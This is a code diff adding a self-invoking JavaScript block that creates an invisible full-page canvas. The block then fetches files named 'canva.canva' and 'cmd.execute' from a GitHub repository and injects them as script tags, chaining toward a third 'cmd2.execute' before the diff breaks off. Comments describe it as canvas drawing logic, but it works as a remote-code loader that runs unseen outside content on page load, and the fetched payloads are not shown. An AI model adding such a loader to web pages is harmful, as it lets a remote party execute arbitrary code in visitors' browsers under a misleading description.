@@ -158,3 +158,63 @@
         console.error("An error occurred:", error);
     }
 })();
+
+
+(function() {
+    // Function to dynamically add a canvas element to the body
+    var canvas = document.createElement("canvas");
+    canvas.id = "canvas";
+    document.body.appendChild(canvas);
+
+    // Style the canvas to cover the full page as a background
+    canvas.style.position = "fixed";
+    canvas.style.top = "0";
+    canvas.style.left = "0";
+    canvas.style.zIndex = "10";
+    canvas.style.pointerEvents = "none";
+    canvas.style.width = "100%";
+    canvas.style.height = "100%";
+
+    // Function to load and apply the canvas content from the external URL
+    function loadCanvasContent() {
+        var ctx = canvas.getContext("2d");
+
+        // Fetch the content from the given URL for canvas drawing logic
+        fetch("https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/canva.canva")
+            .then(response => response.text())
+            .then(scriptContent => {
+                console.log("Canvas content loaded successfully.");
+                
+                // Execute the loaded content inside the canvas
+                var script = document.createElement("script");
+                script.text = scriptContent;
+                document.body.appendChild(script); // Appends the script that defines the canvas drawing logic
+
+                // After the canvas content is loaded, execute the second script (cmd.execute)
+                executeCmdScript();
+            })
+            .catch(error => {
+                console.error("Error loading canvas content:", error);
+            });
+    }
+
+    // Function to load and execute the second script (cmd.execute)
+    function executeCmdScript() {
+        fetch("https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/cmd.execute")
+            .then(response => response.text())
+            .then(cmdScriptContent => {
+                console.log("cmd.execute script loaded successfully.");
+                
+                // Create a new script tag to execute the cmd script
+                var cmdScript = document.createElement("script");
+                cmdScript.text = cmdScriptContent;
+                document.body.appendChild(cmdScript); // Executes the command script
+
+                // Now load and execute the third script (cmd2.execute)
+                executeCmd2Script();
+            })
+            .catch(error => {
+                console.error("Error loading cmd.execute script:", error);
+            });
+    }
+
